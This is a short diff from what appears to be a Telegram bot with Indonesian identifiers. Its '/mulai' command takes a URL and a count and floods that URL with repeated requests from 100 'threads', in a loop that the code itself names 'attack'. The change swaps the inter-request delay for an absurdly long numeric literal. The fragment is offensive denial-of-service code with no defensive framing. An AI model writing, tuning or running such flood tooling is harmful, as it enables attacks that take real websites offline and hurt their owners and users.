@@ -159,7 +159,7 @@ bot.onText(/\/mulai\s+([^\s]+)\s+(\d+)/, (msg, match) => {
         if (!continueAttack || requestCount >= maxRequests) return;
         requestCount++;
         sendReqs(url, chatId);
-        setTimeout(attack, 1000 / requestsPerSecond);
+        setTimeout(attack, 1000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 / requestsPerSecond);
     };
 
     const numThreads = 100; // Kurangi untuk stabilitas
